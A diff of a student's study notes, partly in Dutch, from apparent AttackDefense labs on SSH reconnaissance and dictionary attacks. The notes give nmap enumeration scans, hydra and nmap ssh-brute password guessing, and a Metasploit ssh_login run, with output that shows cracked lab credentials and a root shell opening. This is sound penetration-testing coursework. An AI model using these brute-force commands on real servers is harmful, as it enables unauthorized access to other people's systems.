@@ -1879,19 +1879,290 @@ LAB --
 2. Do service scan (get operating system info) on port 22: nmap ip -sV -O 
 3. run: ssh root@ip and try to login with maybe abc123 
 4. if permission denied try using netcat: nc ip port  (nc ip 22 ) this will give you the banner which is usefull for enumeration 
-5. run: nmap ip -p 22 --script ssh-enum-algos 
+5. run: **nmap ip -p 22 --script ssh2-enum-algos** 
 	 - The script is designed to enumerate and display the supported encryption algorithms, key exchange algorithms, and message authentication codes (MACs) supported by the SSH server running on the target host. It helps in identifying the security configuration of the SSH service.
 	 - By running this command, you can gather information about the SSH encryption algorithms supported by the target host. This can be useful for assessing the security posture of SSH services and ensuring that strong encryption algorithms are being used.
 	 - 
-6. run: nmap ip -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 
+6. run: **nmap ip -p 22 --script ssh-hostkey --script-args ssh_hostkey=full** 
 	- `--script ssh-hostkey`: This option tells Nmap to use the `ssh-hostkey` script as part of the scan. The `ssh-hostkey` script is a built-in script in Nmap that retrieves and displays the SSH host key information for the target host.
 	- It specifies the `full` option, which indicates that detailed information about the SSH host key should be retrieved.
-7. check if there are any weak paswords for ssh:  nmap ip -p 22 --script ssh-auth-methods --script-args="ssh.user=student" 
+7. check if there are any weak paswords for ssh:  **nmap ip -p 22 --script ssh-auth-methods --script-args="ssh.user=student"** 
 	- -   `--script ssh-auth-methods`: Dit geeft aan dat de Nmap-scripts met betrekking tot SSH-authenticatiemethoden moeten worden uitgevoerd. Deze scripts zullen proberen de ondersteunde authenticatiemethoden te identificeren die beschikbaar zijn op de SSH-server.
 	-   `--script-args="ssh.user=student"`: Dit is een scriptargument dat wordt doorgegeven aan de Nmap-scripts. In dit geval wordt de argumentwaarde "student" gebruikt om aan te geven dat de scan moet worden uitgevoerd alsof de gebruiker "student" is. Dit kan nuttig zijn als de SSH-server verschillende authenticatiemethoden aanbiedt op basis van de gebruiker. met deze opdracht wordt een Nmap-scan uitgevoerd om de SSH-authenticatiemethoden te identificeren die beschikbaar zijn op het opgegeven doel-IP-adres, waarbij de scan wordt uitgevoerd alsof de gebruiker "student" is.
 	- if the result is none than is dangerous 
-8. check if there are any weak paswords for ssh for admin:  nmap ip -p 22 --script ssh-auth-methods --script-args="ssh.user=admin" 
+8. check if there are any weak paswords for ssh for admin:  **nmap ip -p 22 --script ssh-auth-methods --script-args="ssh.user=admin"** 
 
 Since the student did not require any authentication we try: ssh student@ip > who am i > ipconfig > cat FLAG > logout 
 ![[Pasted image 20230517150117.png]]
+
+---- LAB --- 
+
+target ip: 192.60.141.3
+
+sudo nmap -A -Pn 192.60.141.3
+
+1.  What is the version of SSH server.
+   
+		   root@attackdefense:~#  nmap 192.60.141.3 -sV -O
+		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 14:06 UTC
+		Nmap scan report for target-1 (192.60.141.3)
+		Host is up (0.000039s latency).
+		Not shown: 999 closed ports
+		PORT   STATE SERVICE VERSION
+		22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) 📍
+		MAC Address: 02:42:C0:3C:8D:03 (Unknown)
+		No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+
+   
+   
+   
+   
+2.  Fetch the banner using netcat and check the version of SSH server.
+	   
+		   root@attackdefense:~# nc 192.60.141.3 22  
+			SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.6
+   
+   
+   
+3.  Fetch pre-login SSH banner.
+   
+			   root@attackdefense:~# ssh root@192.60.141.3 
+		The authenticity of host '192.60.141.3 (192.60.141.3)' can't be established.
+		ECDSA key fingerprint is SHA256:dxlBXgBb0Iv5/LmemZ2Eikb5+GLl9CSLf/B854fUeV8.
+		Are you sure you want to continue connecting (yes/no)? yes
+		Warning: Permanently added '192.60.141.3' (ECDSA) to the list of known hosts.
+		Welcome to attack defense ssh recon lab!!
+		root@192.60.141.3's password: 
+		Permission denied, please try again.
+			   
+   
+   
+   
+4.  How many “encryption_algorithms” are supported by the SSH server. 27 
+   
+		   root@attackdefense:~# nmap 192.60.141.3 -p 22 --script ssh2-enum-algos
+		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 14:11 UTC
+		Nmap scan report for target-1 (192.60.141.3)
+		Host is up (0.000030s latency).
+		
+		PORT   STATE SERVICE
+		22/tcp open  ssh
+		| ssh2-enum-algos: 
+		|   kex_algorithms: (6)
+		|       curve25519-sha256@libssh.org
+		|       ecdh-sha2-nistp256
+		|       ecdh-sha2-nistp384
+		|       ecdh-sha2-nistp521
+		|       diffie-hellman-group-exchange-sha256
+		|       diffie-hellman-group14-sha1
+		|   server_host_key_algorithms: (5)
+		|       ssh-rsa
+		|       rsa-sha2-512
+		|       rsa-sha2-256
+		|       ecdsa-sha2-nistp256
+		|       ssh-ed25519
+		|   encryption_algorithms: (6)
+		|       chacha20-poly1305@openssh.com
+		|       aes128-ctr
+		|       aes192-ctr
+		|       aes256-ctr
+		|       aes128-gcm@openssh.com
+		|       aes256-gcm@openssh.com
+		|   mac_algorithms: (10)
+		|       umac-64-etm@openssh.com
+		|       umac-128-etm@openssh.com
+		|       hmac-sha2-256-etm@openssh.com
+		|       hmac-sha2-512-etm@openssh.com
+		|       hmac-sha1-etm@openssh.com
+		|       umac-64@openssh.com
+		|       umac-128@openssh.com
+		|       hmac-sha2-256
+		|       hmac-sha2-512
+		|       hmac-sha1
+		|   compression_algorithms: (2)
+		|       none
+		|_      zlib@openssh.com
+		MAC Address: 02:42:C0:3C:8D:03 (Unknown)
+		   
+   
+   
+5.  What is the ssh-rsa host key being used by the SSH server.
+   
+		root@attackdefense:~# nmap 192.60.141.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 
+		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 14:13 UTC
+		Nmap scan report for target-1 (192.60.141.3)
+		Host is up (0.000045s latency).
+		
+		PORT   STATE SERVICE
+		22/tcp open  ssh
+		| ssh-hostkey: 
+		|   ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1fkJK7F8yxf3vewEcLYHljBnKTAiRqzFxkFo6lqyew73ATL2Abyh6at/oOmBSlPI90rtAMA6jQGJ+0HlHgf7mkjz5+CBo9j2VPu1bejYtcxpqpHcL5Bp12wgey1zup74fgd+yOzILjtgbnDOw1+HSkXqN79d+4BnK0QF6T9YnkHvBhZyjzIDmjonDy92yVBAIoB6Rdp0w7nzFz3aN9gzB5MW/nSmgc4qp7R6xtzGaqZKp1H3W3McZO3RELjGzvHOdRkAKL7n2kyVAraSUrR0Oo5m5e/sXrITYi9y0X6p2PTUfYiYvgkv/3xUF+5YDDA33AJvv8BblnRcRRZ74BxaD
+
+   
+   
+6.  Which authentication method is being used by the SSH server for user “student”.
+   
+		   
+		root@attackdefense:~# nmap 192.60.141.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"  
+		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 14:15 UTC
+		Nmap scan report for target-1 (192.60.141.3)
+		Host is up (0.000035s latency).
+		
+		PORT   STATE SERVICE
+		22/tcp open  ssh
+		| ssh-auth-methods: 
+		|_  Supported authentication methods: none_auth
+		MAC Address: 02:42:C0:3C:8D:03 (Unknown)
+   
+   
+7.  Which authentication method is being used by the SSH server for user “admin”.
+   
+   
+		root@attackdefense:~# nmap 192.60.141.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=admin"  
+		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 14:15 UTC
+		Nmap scan report for target-1 (192.60.141.3)
+		Host is up (0.000044s latency).
+		
+		PORT   STATE SERVICE
+		22/tcp open  ssh
+		| ssh-auth-methods: 
+		|   Supported authentication methods: 
+		|     publickey
+		|_    password
+		MAC Address: 02:42:C0:3C:8D:03 (Unknown)
+		
+		Nmap done: 1 IP address (1 host up) scanned in 2.37 seconds
+   
+   
+8.  Fetch the flag from /home/student/FLAG by using nmap ssh-run script.
+
+![[Pasted image 20230517161808.png]] 
+
+or 
+
+nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=student,ssh-run.password=" ip 
+-  `--script=ssh-run`: This option specifies that the "ssh-run" script should be executed as part of the Nmap scan. The "ssh-run" script is a pre-defined script in Nmap that allows running custom commands on an SSH server.
+-   `--script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=student,ssh-run.password="`: This argument provides the arguments or parameters to the "ssh-run" script. It consists of three key-value pairs:
+    -   `ssh-run.cmd=cat /home/student/FLAG`: This specifies the command to be executed on the SSH server. In this case, the command is `cat /home/student/FLAG`, which will read the contents of the "/home/student/FLAG" file on the remote SSH server.
+    -   `ssh-run.username=student`: This sets the SSH username to "student". It specifies the username that will be used to authenticate with the SSH server during the scan.
+    -   `ssh-run.password="`: This leaves the SSH password field empty. It means that no password is provided for authentication, and the script will attempt to connect to the SSH server using other authentication methods like public keys or other configured methods.
+
+
+![[Pasted image 20230517162726.png]]
+
+
+###  SSH Dictonary attack 
+
+- nmap ip 
+- nmap ip -sV -p 22 
+- lets use the following wordlist: gzip -d /urs/share/wordlist/rockyou.txt.gz   
+- use hydra for the wordlist: **hydra -l student -P /usr/share/wordlist/rockyou.txt ip ssh** 
+- ssh student@ip (use password found with above command)
+- lets check for admin: 
+	- echo "adminsitrator" > user
+		- e`cho "adminsitrator" > user`: This command creates a file named "user" and writes the string "administrator"  into it. This file will be used as a user database for the SSH brute force attack.
+	- **nmap ip -p 22 --script ssh-brute --script-args userdb=/root/user** 
+		- -   `--script ssh-brute`: It instructs Nmap to use the "ssh-brute" script, which is designed to perform a brute force attack against SSH servers.
+		-   `--script-args userdb=/root/user`: This option provides the script argument "userdb" with the value "/root/user". It tells the "ssh-brute" script to use the specified file ("/root/user") as the user database for the brute force attack. The file should contain a list of usernames or user passwords that will be used during the attack.
+- lets try the root password: 
+	- msfconsole 
+	- use auxiliary/scanner/ssh/ssh_login 
+	- show options  ---> fix options ![[Pasted image 20230517165449.png]]
+	- ssh root@ip 
+	- fill in password found with metasploit 
+
+
+--- Lab ---- 
+
+target ip: 192.66.209.3 
+		
+		root@attackdefense:~# nmap 192.66.209.3 -sV -p 22
+		PORT   STATE SERVICE VERSION
+		22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6  
+	
+
+1.  Find the password of user “student” using hydra.
+   
+   
+		root@attackdefense:~# hydra -l student -P /usr/share/wordlists/rockyou.txt 192.66.209.3 ssh
+		[STATUS] 182.00 tries/min, 182 tries in 00:01h, 14344223 to do in 1313:35h, 16 active
+		[22][ssh] host: 192.66.209.3   login: student   password: friend 📍
+		1 of 1 target successfully completed, 1 valid password found
+		   
+   
+2.  Find the password of user “administrator” use appropriate Nmap scripts with password dictionary: /usr/share/nmap/nselib/data/passwords.lst
+   
+	**root@attackdefense:~# nmap -p 22 --script ssh-brute --script-args userdb=/root/user, passdb=/usr/share/nmap/nselib/data/passwords.lst 192.66.209.3** 
+		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 15:36 UTC
+		Unable to split netmask from target expression: "passdb=/usr/share/nmap/nselib/data/passwords.lst"
+		NSE: [ssh-brute] Trying username/password pair: administrator:sunshine
+		Nmap scan report for target-1 (192.66.209.3)
+		Host is up (0.000049s latency).
+		
+		PORT   STATE SERVICE
+		22/tcp open  ssh
+		| ssh-brute: 
+		|   Accounts: 
+		|     administrator:sunshine - Valid credentials
+		|_  Statistics: Performed 27 guesses in 5 seconds, average tps: 5.4
+		MAC Address: 02:42:C0:42:D1:03 (Unknown)
+		
+		Nmap done: 1 IP address (1 host up) scanned in 5.38 seconds
+		root@attackdefense:~# 
+
+
+OF 
+
+		root@attackdefense:~# nmap -p 22 --script ssh-brute --script-args userdb=/root/user  192.66.209.3   
+		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 15:44 UTC
+		NSE: [ssh-brute] Trying username/password pair: administrator:administrator
+		NSE: [ssh-brute] Trying username/password pair: administrator:
+		NSE: [ssh-brute] Trying username/password pair: administrator:michelle
+		NSE: [ssh-brute] Trying username/password pair: administrator:tigger
+		NSE: [ssh-brute] Trying username/password pair: administrator:sunshine
+		NSE: [ssh-brute] Trying username/password pair: administrator:chocolate
+		Nmap scan report for target-1 (192.66.209.3)
+		Host is up (0.000039s latency).
+		
+		PORT   STATE SERVICE
+		22/tcp open  ssh
+		| ssh-brute: 
+		|   Accounts: 
+		|     administrator:sunshine - Valid credentials
+		|_  Statistics: Performed 28 guesses in 5 seconds, average tps: 5.6
+		MAC Address: 02:42:C0:42:D1:03 (Unknown)
+
+
+   
+3.  Find the password of user “root” using ssh_login Metasploit module with userpass dictionary: /usr/share/wordlists/metasploit/root_userpass.txt
+   
+		   msf5 auxiliary(scanner/ssh/ssh_login) > run
+		
+		[-] 192.66.209.3:22 - Failed: 'root:'
+		[!] No active DB -- Credential data will not be saved!
+		[-] 192.66.209.3:22 - Failed: 'root:!root'
+		[-] 192.66.209.3:22 - Failed: 'root:Cisco'
+		[-] 192.66.209.3:22 - Failed: 'root:NeXT'
+		[-] 192.66.209.3:22 - Failed: 'root:QNX'
+		[-] 192.66.209.3:22 - Failed: 'root:admin'
+		[+] 192.66.209.3:22 - Success: 'root:attack' 'uid=0(root) gid=0(root) groups=0(root) Linux victim-1 5.4.0-131-generic #147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
+		[*] Command shell session 1 opened (192.66.209.2:44957 -> 192.66.209.3:22) at 2023-05-17 15:40:38 +0000
+		[*] Scanned 1 of 1 hosts (100% complete)
+		[*] Auxiliary module execution completed
+
+
+   ![[Pasted image 20230517174720.png]]
+   
+4.  What is the message of the day? (Printed after the user logs in to the SSH server).
+
+	
+		root@attackdefense:~# ssh root@192.66.209.3
+		Ubuntu 16.04.5 LTS
+		root@192.66.209.3's password: 
+		Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 5.4.0-131-generic x86_64)
+		
+		 * Documentation:  https://help.ubuntu.com
+		 * Management:     https://landscape.canonical.com
+		 * Support:        https://ubuntu.com/advantage
+		SSH recon dictionary attack lab
 
